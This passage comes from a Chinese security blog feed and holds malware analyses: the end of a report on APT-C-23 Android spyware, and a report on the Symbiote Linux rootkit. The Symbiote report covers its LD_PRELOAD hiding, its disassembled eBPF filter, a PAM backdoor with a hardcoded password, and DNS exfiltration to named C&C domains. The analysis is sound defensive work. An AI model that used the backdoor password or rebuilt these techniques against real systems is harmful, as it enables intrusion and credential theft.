title="SMS指令"></a>SMS指令</h3><p>当受害者接收到手机短信时,App检测是否是包含C&amp;C指令,短消息中包含链接并且连接中包含字符串”/version=”则为C&amp;C指令。</p><p><img src="326471a1/8edfbc608fe0eac438c47f60e4454732.png"></p><p>如果不是C&amp;C指令, 将消息写入文件并加密压缩然后上传到C&amp;C服务器。</p><p><img src="326471a1/cffd47bcaa56f52ecb5c3da9b185ab4e.png"></p><p>下表是SMS实现C&amp;C的指令ID,SMS只负责下发指令,如有数据需要上传则上传到C&amp;C服务器。</p><p>接收到的C&amp;C链接为“{任意消息}{任意链接}/version={指令ID}”,如果对应的指令需要参数则在指令ID后面接”/{参数1}/{参数2}/…/{参数n}”。大部分指令与FCM下发的指令功能重合。</p><table><thead><tr><th>指令ID</th><th>描述</th></tr></thead><tbody><tr><td>01</td><td>自定义时间录音</td></tr><tr><td>04</td><td>停止所有录音</td></tr><tr><td>03</td><td>监控短信接收和发送</td></tr><tr><td>59</td><td>激活所有监听器</td></tr><tr><td>95</td><td>停止所有监听器</td></tr><tr><td>34</td><td>使用手机流量</td></tr><tr><td>43</td><td>禁用手机流量</td></tr><tr><td>77</td><td>获取App详细信息</td></tr><tr><td>00</td><td>启用WIFI</td></tr><tr><td>99</td><td>禁用WIFI</td></tr><tr><td>44</td><td>获取通讯录里的联系方式</td></tr><tr><td>66</td><td>获取手机信息</td></tr><tr><td>88</td><td>获取文件和文件夹信息</td></tr><tr><td>07</td><td>设置C&amp;C地址</td></tr></tbody></table><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h1><p>针对此类恶意软件,我们建议</p><ul><li>  从google play商店等官方应用商店下载和安装应用。</li><li>  如果在设备上发现任何可以应用程序,清立即卸载或删除他们。</li><li>  将Android设备、操作系统和应用程序更新到最新版本。</li></ul><h1 id="6-安全检测"><a href="#6-安全检测" class="headerlink" title="6. 安全检测"></a>6. 安全检测</h1><table><thead><tr><th>样本名</th><th>Hash</th><th>TopEDR检测</th><th>Yara检测</th><th>备注</th></tr></thead><tbody><tr><td>Google Play Installer</td><td>dd4596cf68c85eb135f7e0ad763e5dab</td><td>Backdoor/Android.Agent.g</td><td>Topsec-APT.APT_C_23SpyC32</td><td></td></tr></tbody></table><h1 id="7-IOC"><a href="#7-IOC" class="headerlink" title="7. IOC"></a>7. IOC</h1><p>dd4596cf68c85eb135f7e0ad763e5dab</p><h1 id="8-ATT-amp-CK矩阵"><a href="#8-ATT-amp-CK矩阵" class="headerlink" title="8. ATT&amp;CK矩阵"></a>8. ATT&amp;CK矩阵</h1><table><thead><tr><th>Tactic</th><th>ID</th><th>Name</th><th>Description</th></tr></thead><tbody><tr><td>Initial Access</td><td>T1444</td><td>Command and Scripting Interpreter</td><td>伪装成合法应用</td></tr><tr><td></td><td>T1476</td><td>Deliver Maliciour App via other Means</td><td>该应用能从应用商店下载</td></tr><tr><td>Execution</td><td>T1575</td><td>Native Code</td><td>使用jni函数返回被加密的C&amp;C字符串。</td></tr><tr><td>Persistence</td><td>T1402</td><td>Broadcast Receivers</td><td>注册广播BOOT_COMPLETED确保设备启动时应用被激活。</td></tr><tr><td>Defense Evasion</td><td>T1508</td><td>Supperss Application</td><td>隐藏自身图标</td></tr><tr><td>Discovery</td><td>T1418</td><td>Application Discovery</td><td>遍历所有安装的应用</td></tr><tr><td></td><td>T1420</td><td>File and Directory Discovery</td><td></td></tr><tr><td></td><td>T1426</td><td>System Information Discovery</td><td>收集设备的详细信息。</td></tr><tr><td>Collection</td><td>T1433</td><td>Access Call Log</td><td>收集历史通话记录</td></tr><tr><td></td><td>T1432</td><td>Access Contact List</td><td>收集通讯录</td></tr><tr><td></td><td>T1517</td><td>Access Notifications</td><td>从社交App的通知消息中提取信息</td></tr><tr><td></td><td>T1429</td><td>Capture Audio</td><td>对通话录音</td></tr><tr><td></td><td>T1512</td><td>Cature Camera</td><td>使用前置或后置摄像头拍照。</td></tr><tr><td></td><td>T1412</td><td>Cature SMS Messages</td><td>收集短消息</td></tr><tr><td></td><td>T1533</td><td>Data from Local System</td><td>从外部媒体中窃取具有特定后缀名的文件。</td></tr><tr><td></td><td>T1513</td><td>Screen Capture</td><td>屏幕截图</td></tr><tr><td>Command and Control</td><td>T1438</td><td>Alternative Network Mediums</td><td>使用SMS接收C&amp;C消息</td></tr><tr><td></td><td>T1437</td><td>Standard Application Layper Protocol</td><td>使用FCM下发C&amp;C消息</td></tr><tr><td></td><td>T1544</td><td>Remote File Copy</td><td>能从C&amp;C服务器下载恶意应用</td></tr><tr><td>Exfiltration</td><td>T1532</td><td>Data Encrypted</td><td>收集的文件使用zip加密压缩。</td></tr><tr><td>Impact</td><td>T1447</td><td>Delete device data</td><td>能够删除文件</td></tr></tbody></table><h1 id="9-参考"><a href="#9-参考" class="headerlink" title="9. 参考"></a>9. 参考</h1><p><a href="https://www.welivesecurity.com/2020/09/30/aptc23-group-evolves-its-android-spyware/">https://www.welivesecurity.com/2020/09/30/aptc23-group-evolves-its-android-spyware/</a><br><a href="https://blog.cyble.com/2021/09/15/apt-c-23-using-new-variant-of-android-spyware-to-target-users-in-the-middle-east/">https://blog.cyble.com/2021/09/15/apt-c-23-using-new-variant-of-android-spyware-to-target-users-in-the-middle-east/</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;2016年1月起至今，双尾蝎组织对巴勒斯坦教育机构、军事机构等重要领域展开了有组织、有计划、有针对性的长时间不间断攻击。攻击平台包括Windows 与 Android，攻击范围主要为中东地区&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;此次捕获的恶意软件名为”Google Play Installer”，安装后伪装成Telegram应用程序类似的图标和界面。&lt;/p&gt;
&lt;h1 id=&quot;样本信息&quot;&gt;&lt;a href=&quot;#样本信息&quot; class=&quot;headerlink&quot; title=&quot;样本信息&quot;&gt;&lt;/a&gt;样本信息&lt;/h1&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;md5&lt;/th&gt;
&lt;th&gt;dd4596cf68c85eb135f7e0ad763e5dab&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;文件类型&lt;/td&gt;
&lt;td&gt;Apk&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;包名&lt;/td&gt;
&lt;td&gt;org.telegram.light&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;文件大小&lt;/td&gt;
&lt;td&gt;26MB&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;应用名&lt;/td&gt;
&lt;td&gt;Google Play Installer&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h1 id=&quot;流程图&quot;&gt;&lt;a href=&quot;#流程图&quot; class=&quot;headerlink&quot; title=&quot;流程图&quot;&gt;&lt;/a&gt;流程图&lt;/h1&gt;&lt;img src=&quot;/post/326471a1/423d81fe19ff15e345ef18bc35968493.png&quot; class=&quot;&quot; title=&quot;example&quot;&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Symbiote：几乎不可能被检测到的Linux rootkit</title>
    <link href="http://shxi.cc/post/9c0caec3.html"/>
    <id>http://shxi.cc/post/9c0caec3.html</id>
    <published>2023-11-01T07:10:44.000Z</published>
    <updated>2024-03-27T02:53:03.121Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp;Symbiote由威胁情报公司BlackBerry和Intezer命名，原因是该恶意程序能够将自己隐藏在正在运行的进程或者网络流量中，像寄生虫一样耗尽受害者的资源。<br>&emsp;&emsp;Symbiote背后的组织在2021年11开始开发该恶意程序，主要用来攻击拉丁美洲的金融部门，包括巴西银行和Caixa银行。<br>&emsp;&emsp;Symbiote与其他Linux恶意程序不同之处在于它利用一个名为LD_PRELOAD的linux特性通过动态链接器将其加载到所有正在运行的进程中。</p><h1 id="2-样本详情"><a href="#2-样本详情" class="headerlink" title="2. 样本详情"></a>2. 样本详情</h1><table><thead><tr><th>文件名</th><th>liblinux.so</th></tr></thead><tbody><tr><td>Md5</td><td>59033839c1be695c83a68924979fab58</td></tr><tr><td>文件类型</td><td>Linux64共享库</td></tr></tbody></table><span id="more"></span><h1 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3. 详细分析"></a>3. 详细分析</h1><h2 id="3-2-隐藏文件或进程"><a href="#3-2-隐藏文件或进程" class="headerlink" title="3.2 隐藏文件或进程"></a>3.2 隐藏文件或进程</h2><p>&emsp;&emsp;在linux中,所有对象都可以看作是文件，恶意程序为了隐藏自身，拦截了多个linux系统下用于操作文件的函数，为了隐藏文件或进程拦截的函数如下，函数返回值为在对隐藏文件或进程列表中的对象进行操作时函数的返回值。</p><table><thead><tr><th>函数名</th><th>目的</th><th>函数返回值</th></tr></thead><tbody><tr><td>fstatat</td><td>隐藏进程</td><td>返回-1</td></tr><tr><td>fstatat64</td><td>隐藏进程</td><td>返回-1</td></tr><tr><td>statx</td><td>隐藏进程</td><td>返回-1</td></tr><tr><td>stat</td><td>隐藏进程</td><td>返回-1</td></tr><tr><td>readdir</td><td>隐藏进程或文件</td><td>返回遍历的下一个不在隐藏列表的进程或文件</td></tr><tr><td>readdir64</td><td>隐藏进程或文件</td><td>返回遍历的下一个不在隐藏列表的进程或文件</td></tr></tbody></table><p>&emsp;&emsp;在linux下进程的路径为”/proc/[pid]”,因此只要判断是否包含字符”proc”和pid是否为数字就能判断一些函数操作的对象是进程还是文件。</p><h3 id="1-隐藏文件"><a href="#1-隐藏文件" class="headerlink" title="1. 隐藏文件"></a>1. 隐藏文件</h3><p>&emsp;&emsp;恶意程序将需要隐藏的文件名以RC4加密算法加密并硬编码保存在程序内。在linux函数对文件操作时将路径与要隐藏的文件匹配，如果匹配程序则根据函数不同返回对应的结果，比如readdir/readdir64遍历到要隐藏的文件时跳过该文件遍历下一个文件。<br><img src="9c0caec3/234bf466b0aa35f8857d3998caebf61a.png"></p><h3 id="隐藏进程"><a href="#隐藏进程" class="headerlink" title="隐藏进程"></a>隐藏进程</h3><p>恶意程序读取文件”/proc/[pid]/cmdline”获取进程的命令行参数判断加载恶意程序的进程是否是进程”strace”、”javaserverx64”、”javaclientex64”和”javanodex86”。<br><img src="9c0caec3/adc4f55432c06a81a29d58cfb1ed233b.png"></p><h2 id="3-3-隐藏进程网络连接"><a href="#3-3-隐藏进程网络连接" class="headerlink" title="3.3 隐藏进程网络连接"></a>3.3 隐藏进程网络连接</h2><p>&emsp;&emsp;恶意程序采用多种不同的方式来隐藏网络流量，主要有拦截fopen/fopen64函数、添加eBPF代码到原过滤器代码头部两种。两种方式隐藏的IP或者端口如下:</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IP地址:</span><br><span class="line"><span class="number">10.123.36.58</span> </span><br><span class="line"><span class="number">10.123.8.187</span> </span><br><span class="line"><span class="number">10.123.8.33</span> </span><br><span class="line"><span class="number">10.123.8.23</span> </span><br><span class="line"><span class="number">10.123.8.50</span></span><br><span class="line">端口号:</span><br><span class="line"><span class="number">45345</span></span><br><span class="line"><span class="number">2054</span></span><br><span class="line"><span class="number">32821</span></span><br></pre></td></tr></table></figure><h3 id="拦截fopen-fopen64"><a href="#拦截fopen-fopen64" class="headerlink" title="拦截fopen/fopen64"></a>拦截fopen/fopen64</h3><p>&emsp;&emsp;如果程序尝试打开文件”/proc/net/tcp”文件，恶意程序就会逐行匹配该文件的每一行，判断是否包含指定的IP或者端口，如果不是则将其复制到临时文件，否则匹配下一行。最后返回临时文件的文件描述符，该文件已经将需要隐藏的端口或者IP地址从tcp文件中移除了。</p><p><img src="9c0caec3/9b4217dae37612202d3a1505fabf08ce.png"></p><h3 id="2-劫持eBPF数据包过滤器"><a href="#2-劫持eBPF数据包过滤器" class="headerlink" title="2. 劫持eBPF数据包过滤器"></a>2. 劫持eBPF数据包过滤器</h3><p>&emsp;&emsp;恶意程序为了能够劫持eBPF数据包过滤器拦截函数setsockopt，并判断flags是否为SO_ATTACH_FILTER确定是否使用eBPF数据包过滤器,<br>如果使用了eBPF数据包过滤器，恶意程序会在原eBPF过滤代码之前添加自己的字节码用于将与自身相关的网络连接相关信息从过滤器丢弃。因此使用了eBPF过滤器的一些应用或防火墙不能够获取对应的数据包从而达到隐藏网络连接的目的。</p><p><img src="9c0caec3/59cbf3688f1864c6aabd3d4dbe0b54c5.png"></p><p>反汇编的eBPF字节码如下:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[0x00]</span> ldabsh <span class="number">0</span>,<span class="number">0</span>,c</span><br><span class="line"><span class="string">[0x01]</span> jeq <span class="number">0</span>,<span class="number">800</span>,<span class="number">1</span>a00</span><br><span class="line"><span class="comment">//判断源ip地址是否是以下四个值</span></span><br><span class="line"><span class="comment">///0xa7b243a, [ip]10.123.36.58</span></span><br><span class="line"><span class="comment">///0xa7b08bb, [ip]10.123.8.187</span></span><br><span class="line"><span class="comment">///0xa7b0821, [ip]10.123.8.33</span></span><br><span class="line"><span class="comment">///0xa7b0817, [ip]10.123.8.23</span></span><br><span class="line"><span class="comment">// 0xa7b0832, [ip]10.123.8.50</span></span><br><span class="line"><span class="string">[0x02]</span> ldabse <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>a</span><br><span class="line"><span class="string">[0x03]</span> jeq <span class="number">0</span>,a7b243a,<span class="number">35</span></span><br><span class="line"><span class="string">[0x04]</span> jeq <span class="number">0</span>,a7b08bb,<span class="number">34</span></span><br><span class="line"><span class="string">[0x05]</span> jeq <span class="number">0</span>,a7b0821,<span class="number">33</span></span><br><span class="line"><span class="string">[0x6]</span> jeq <span class="number">0</span>,a7b0817,<span class="number">32</span></span><br><span class="line"><span class="string">[0x07]</span> jeq <span class="number">0</span>,a7b0832,<span class="number">31</span></span><br><span class="line"><span class="comment">//判断目标地址 如果r0寄存器等于如下IP地址跳转到偏移0x38</span></span><br><span class="line"><span class="string">[0x08]</span> ldabse <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>e</span><br><span class="line"><span class="string">[0x09]</span> jeq <span class="number">0</span>,a7b243a,<span class="number">2f</span> </span><br><span class="line"><span class="string">[0x0a]</span> jeq <span class="number">0</span>,a7b08bb,<span class="number">2</span>e</span><br><span class="line"><span class="string">[0x0b]</span> jeq <span class="number">0</span>,a7b0821,<span class="number">2</span>d</span><br><span class="line"><span class="string">[0x0c]</span> jeq <span class="number">0</span>,a7b0817,<span class="number">2</span>c</span><br><span class="line"><span class="string">[0x0d]</span> jeq <span class="number">0</span>,a7b0832,<span class="number">2</span>b</span><br><span class="line"><span class="comment">//判断协议类型</span></span><br><span class="line"><span class="string">[0x0e]</span> ldabsb <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span> </span><br><span class="line"><span class="string">[0x0f]</span> jeq <span class="number">0</span>,<span class="number">84</span>,<span class="number">2</span> <span class="comment">//判断是否是SCTP</span></span><br><span class="line"><span class="string">[0x10]</span> jeq <span class="number">0</span>,<span class="number">6</span>,<span class="number">1</span> <span class="comment">//判断是否是TCP协议</span></span><br><span class="line"><span class="string">[0x11]</span> jeq <span class="number">0</span>,<span class="number">11</span>,<span class="number">2800</span> <span class="comment">//判断是否是UDP协议</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//ipv4 flag</span></span><br><span class="line"><span class="string">[0x12]</span> ldabsh <span class="number">0</span>,<span class="number">0</span>,<span class="number">14</span> </span><br><span class="line"><span class="string">[0x13]</span> jset <span class="number">0</span>,<span class="number">1f</span>ff,<span class="number">26</span><span class="comment">// 如果if (r0&amp;0x1FFF) goto off[0x38]</span></span><br><span class="line"><span class="string">[0x14]</span>unkown opencode <span class="number">0x0000000E000000B1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断端口?</span></span><br><span class="line"><span class="string">[0x015]</span> ldindh <span class="number">0</span>,<span class="number">0</span>,e</span><br><span class="line"><span class="string">[0x016]</span> jeq <span class="number">0</span>,b121,<span class="number">22</span></span><br><span class="line"><span class="string">[0x017]</span> jeq <span class="number">0</span>,<span class="number">86e7</span>,<span class="number">21</span></span><br><span class="line"><span class="string">[0x018]</span> jeq <span class="number">0</span>,fc1f,<span class="number">20</span></span><br><span class="line"><span class="string">[0x019]</span> jeq <span class="number">0</span>,<span class="number">6045</span>,<span class="number">1f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用ipv4,判断totalLen是否为固定值</span></span><br><span class="line"><span class="string">[0x01a]</span> ldindh <span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span></span><br><span class="line"><span class="string">[0x01b]</span> jeq <span class="number">0</span>,b121,<span class="number">1</span>a1d <span class="comment">//45345</span></span><br><span class="line"><span class="string">[0x01c]</span> jeq <span class="number">0</span>,<span class="number">806</span>,<span class="number">1</span> <span class="comment">//2054</span></span><br><span class="line"><span class="string">[0x01d]</span> jeq <span class="number">0</span>,<span class="number">8035</span>,c00 <span class="comment">//32821</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[0x1e]</span> ldabse <span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>c</span><br><span class="line"><span class="string">[0x01f]</span> jeq <span class="number">0</span>,a7b243a,<span class="number">19</span></span><br><span class="line"><span class="string">[0x020]</span> jeq <span class="number">0</span>,a7b08bb,<span class="number">18</span></span><br><span class="line"><span class="string">[0x21]</span> jeq <span class="number">0</span>,a7b0821,<span class="number">17</span></span><br><span class="line"><span class="string">[0x22]</span> jeq <span class="number">0</span>,a7b0817,<span class="number">16</span></span><br><span class="line"><span class="string">[0x23]</span> jeq <span class="number">0</span>,a7b0832,<span class="number">15</span></span><br><span class="line"><span class="string">[0x24]</span> ldabse <span class="number">0</span>,<span class="number">0</span>,<span class="number">26</span></span><br><span class="line"><span class="string">[0x25]</span> jeq <span class="number">0</span>,a7b243a,<span class="number">13</span></span><br><span class="line"><span class="string">[0x26]</span> jeq <span class="number">0</span>,a7b08bb,<span class="number">12</span></span><br><span class="line"><span class="string">[0x27]</span> jeq <span class="number">0</span>,a7b0821,<span class="number">11</span></span><br><span class="line"><span class="string">[0x28]</span> jeq <span class="number">0</span>,a7b0817,<span class="number">10</span></span><br><span class="line"><span class="string">[0x29]</span> jeq <span class="number">0</span>,a7b0832,<span class="number">100f</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否是IPv6 </span></span><br><span class="line"><span class="string">[0x2a]</span> jeq <span class="number">0</span>,<span class="number">86</span>dd,f00</span><br><span class="line"><span class="string">[0x2b]</span> ldabsb <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span></span><br><span class="line"><span class="string">[0x2c]</span> jeq <span class="number">0</span>,<span class="number">84</span>,<span class="number">2</span></span><br><span class="line"><span class="string">[0x2d]</span> jeq <span class="number">0</span>,<span class="number">6</span>,<span class="number">1</span></span><br><span class="line"><span class="string">[0x2e]</span> jeq <span class="number">0</span>,<span class="number">11</span>,b00</span><br><span class="line"><span class="comment">//判断TCP源端口</span></span><br><span class="line"><span class="string">[0x2f]</span> ldabsh <span class="number">0</span>,<span class="number">0</span>,<span class="number">36</span></span><br><span class="line"><span class="string">[0x30]</span> jeq <span class="number">0</span>,b121,<span class="number">8</span> <span class="comment">//45345</span></span><br><span class="line"><span class="string">[0x31]</span> jeq <span class="number">0</span>,<span class="number">86e7</span>,<span class="number">7</span> <span class="comment">//34535</span></span><br><span class="line"><span class="string">[0x32]</span> jeq <span class="number">0</span>,fc1f,<span class="number">6</span> <span class="comment">//64543</span></span><br><span class="line"><span class="string">[0x33]</span> jeq <span class="number">0</span>,<span class="number">6045</span>,<span class="number">5</span> <span class="comment">//24645</span></span><br><span class="line"><span class="comment">//判断TCP目的端口</span></span><br><span class="line"><span class="string">[0x34]</span> ldabsh <span class="number">0</span>,<span class="number">0</span>,<span class="number">38</span></span><br><span class="line"><span class="string">[0x35]</span> jeq <span class="number">0</span>,b121,<span class="number">3</span></span><br><span class="line"><span class="string">[0x36]</span> jeq <span class="number">0</span>,<span class="number">86e7</span>,<span class="number">2</span></span><br><span class="line"><span class="string">[0x37]</span> jeq <span class="number">0</span>,fc1f,<span class="number">1</span></span><br><span class="line"><span class="string">[0x38]</span> jeq <span class="number">0</span>,<span class="number">6045</span>,<span class="number">100</span></span><br><span class="line"><span class="string">[0x06]</span> unkown opencode  <span class="number">0x06</span></span><br></pre></td></tr></table></figure><h2 id="3-4-隐藏共享库加载"><a href="#3-4-隐藏共享库加载" class="headerlink" title="3.4 隐藏共享库加载"></a>3.4 隐藏共享库加载</h2><p>&emsp;&emsp;恶意程序是通过LD_PRELOAD方式被所有程序加载，如果环境变量<strong>LD_TRACE_LOADED_OBJECTS</strong><br>被设置为1会导致动态链接检查工具能够检测出恶意程序被加载。</p><p>&emsp;&emsp;恶意程序判断环境变量<strong>LD_TRACE_LOADED_OBJECTS</strong>是否被设置为1，如果是则调用原execve函数获取执行结果，再从已加载共享库中将<strong>liblinux.so</strong>从结果中移除从而达到隐藏自身的目的。</p><p><img src="9c0caec3/9da87dfa55837cc06a380f00e8ef569b.png"></p><h2 id="3-5-keylogger"><a href="#3-5-keylogger" class="headerlink" title="3.5 keylogger"></a>3.5 keylogger</h2><p>&emsp;&emsp;恶意程序拦截read函数并在进程满足条件的情况下执行keylogger功能。<br><img src="9c0caec3/18f55b63c68cfe673519b88c82ef8473.png"></p><p>&emsp;&emsp;恶意程序执行keylogger功能需要满足的条件为加载该恶意程序的进程为终端并且符号链接以”/ssh”或”/scp”结尾。</p><p><img src="9c0caec3/dc5025ac86927747fc0483d3dff1255c.png"></p><p>&emsp;&emsp;恶意程序还收集受害者机器上除了local接口的所有网络接口和应用程序使用的命令行。</p><p>&emsp;&emsp;每个网络接口之间使用分隔符”;”分隔;最终将所有收集到的信息以一定的格式保存后使用硬编码的RC4密钥加密保存到文件”usr/include/java.h”并通过DNS协议发送到C&amp;C服务器。</p><p><img src="9c0caec3/0c5a40626ef266c4ae19808a279a2fb5.png"></p><h2 id="3-6-PAM后门"><a href="#3-6-PAM后门" class="headerlink" title="3.6 PAM后门"></a>3.6 PAM后门</h2><p>&emsp;&emsp;PAM是一种认证模块，是Linux系统上用于用户身份验证的机制。恶意程序通过劫持PAM中的三个函数来修改身份验证逻辑，这三个函数分别是pam_set_item、pam_authenticate和pam_acct_mgmt。</p><p>&emsp;&emsp;函数pam_set_item用于设置PAM相关项的信息,当传入函数的额第二个参数值为PAM_AUTHTOK(6)时，表示设置设置身份验证的密码。恶意程序拦截该函数的目的是为了获取受害者机器使用PAM身份验证的密码并将其保存到全局变量pampassword，该变量的值主要用于与硬编码的密码进行比较，恶意程序会根据比较结果执行不同的操作。</p><p><img src="9c0caec3/00db18922f046413d38c069f985e80ac.png"></p><p>&emsp;&emsp;函数pam_authenticate为PAM身份验证函数，恶意程序将受害者使用的认证与硬编码的密码suporte42caixa32进行比较，如果匹配成功则返回身份验证成功的返回值，即对于任何使用PAM作为身份验证的程序或者服务，攻击者只需要指定验证密码为suporte42caixa32和使用任意用户名就能够绕过验证而成功登录。</p><p><img src="9c0caec3/74a80d270e020e601849c75f045fcc33.png" alt=" "></p><p>&emsp;&emsp;如果与硬编码的密码匹配失败但是成功通过PAM身份验证，则获取受害者机器服务名、主机名、用户名和通过PAM身份验证的密码。<br>&emsp;&emsp;恶意程序使用RC4算法加密收集到的信息并保存到文件”/usr/include/java.h”。加密信息使用的RC4加密密钥通过使用硬编码的密钥对”suporte42caixa32”加密后得出。</p><p>收集到的信息未加密前保存格式如下:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">pam |</span><span class="template-variable">&#123;服务名&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;主机名&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;用户名&#125;</span><span class="language-xml">|</span><span class="template-variable">&#123;pam身份验证密码&#125;</span></span><br></pre></td></tr></table></figure><p><img src="9c0caec3/f2738193bb3108b76cb8d108a2244a6e.png"></p><p>&emsp;&emsp;函数pam_acct_mgmt用于确定用户是否有效,恶意程序为了能够使用任意用户名通过PAM服务验证，修改该函数的验证逻辑。当使用该函数来验证密码为suporte42caixa32的用户时总是返回验证成功。<br><img src="9c0caec3/9e6a74712e2ec0177dcea28490531fe9.png"></p><h2 id="3-7-DNS后门"><a href="#3-7-DNS后门" class="headerlink" title="3.7 DNS后门"></a>3.7 DNS后门</h2><h3 id="1-泄露信息"><a href="#1-泄露信息" class="headerlink" title="1. 泄露信息"></a>1. 泄露信息</h3><p>&emsp;&emsp;恶意程序在执行PAM后门和keylogger功能时利用DNS地址A记录来泄露收集到的信息到C&amp;C服务器而不必担心防火墙和流量规则。恶意程序调用函数uname获取操作系统相关信息,然后通过一系列运算得到hash值作为DNS地址A记录的一部分来标识受害者机器。</p><p><img src="9c0caec3/53bf94be52ef8490e808f15e8727ccdd.png"></p><p>&emsp;&emsp;恶意程序使用密钥suporte42caixa32对要泄露的数据使用RC4算法加密,由于DNS域A记录有着长度限制，只能在域名中携带少量数据。</p><p>&emsp;&emsp;恶意程序采用将要发送的数据以0x20的大小分成多个数据块，然后依次拼接DNS域A记录并发送数据到C&amp;C服务器，直接所有数据发送完。DNS域A记录中第一部分用来标识数据块的索引,索引从11111开始计数。C&amp;C服务器通过索引再将接收的数据通过索引组合然后解密。<br>DNS域A记录使用的格式如下:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-variable">&#123;数据库索引&#125;</span><span class="language-xml">.</span><span class="template-variable">&#123;机器标识&#125;</span><span class="language-xml">.</span><span class="template-variable">&#123;要发送的数据块&#125;</span><span class="language-xml">.x3206.caixi.cx</span></span><br></pre></td></tr></table></figure><p>数据泄露到C&amp;C服务器代码如下:</p><p><img src="9c0caec3/81699882c1f1e7ea20f74a775169675d.png"></p><h3 id="2-执行shell脚本"><a href="#2-执行shell脚本" class="headerlink" title="2. 执行shell脚本"></a>2. 执行shell脚本</h3><p>&emsp;&emsp;在受害者使用pam身份验证服务登录成功后,除了泄露收集的密码信息外，还会通过向C&amp;C服务器发送DNS TXT记录请求来接收要执行的shell脚本。<br>&emsp;&emsp;恶意程序将标准输入文件、标准输出文件和标准出错文件三个文件描述符重定向到空设备”/dev/null”，这样在执行脚本时不会输出任何数据。<br><img src="9c0caec3/02da26743df73d6cede3bf853b1a869e.png"></p><p>恶意软件向C&amp;C服务器发送的DNS TXT格式如下:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;机器标识&#125;<span class="selector-class">.x4206</span><span class="selector-class">.caixa</span>.cx</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;恶意程序首先向”0.x4206.caixa.cx”获取从TXT 记录中获取ed25519<br>私钥签名，然后按照同样方式递增DNS域依次从TXT记录中读取数据，最后在验证ed25519签名是否正确，验证通过后使用生成的bash进程来执行shell脚本。</p><p><img src="9c0caec3/d7c16040c53c2a2c40e8ff22a65cdac0.png"></p><h1 id="4-安全检测"><a href="#4-安全检测" class="headerlink" 